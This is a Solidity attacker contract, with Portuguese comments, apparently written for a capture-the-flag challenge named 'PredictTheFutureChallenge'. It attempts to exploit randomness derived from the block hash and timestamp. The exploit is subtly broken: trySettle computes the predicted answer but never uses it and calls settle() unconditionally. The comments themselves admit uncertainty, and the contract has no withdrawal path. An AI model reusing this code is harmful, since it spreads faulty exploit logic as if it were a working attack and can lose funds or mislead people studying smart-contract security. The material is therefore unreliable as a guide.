pragma solidity ^0.4.21;

interface PredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract Attacker {
    PredictTheFutureChallenge public challenge;
    
    function Attacker(address challengeAddress) public {
        challenge = PredictTheFutureChallenge(challengeAddress);
    }
    
    // Função para fazer lock do palpite
    function lockInGuess(uint8 n) public payable {
        require(msg.value == 1 ether);
        challenge.lockInGuess.value(1 ether)(n);
    }
    
    // Função para calcular e verificar se podemos chamar settle()
    function trySettle() public {
        // Calcular o número que será gerado no bloco atual
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        
        // Só chamar settle() se o número calculado corresponder ao que fizemos lock
        // Mas não sabemos qual foi o número do lock, então vamos tentar chamar
        // Se não for o correto, a transação vai reverter ou não transferir
        challenge.settle();
    }
    
    // Função completa: fazer lock e tentar settle quando possível
    function attack() public payable {
        require(msg.value == 1 ether);
        
        // Estratégia: fazer lock com um número e depois tentar settle() em blocos futuros
        // Como há apenas 10 possibilidades, podemos tentar todas
        // Mas a melhor estratégia é calcular qual número será gerado ANTES de fazer lock
        
        // Calcular qual número será gerado no próximo bloco (block.number + 2)
        // Mas não sabemos o timestamp exato, então vamos fazer lock com 0 primeiro
        challenge.lockInGuess.value(1 ether)(0);
    }
    
    function() public payable {}
}

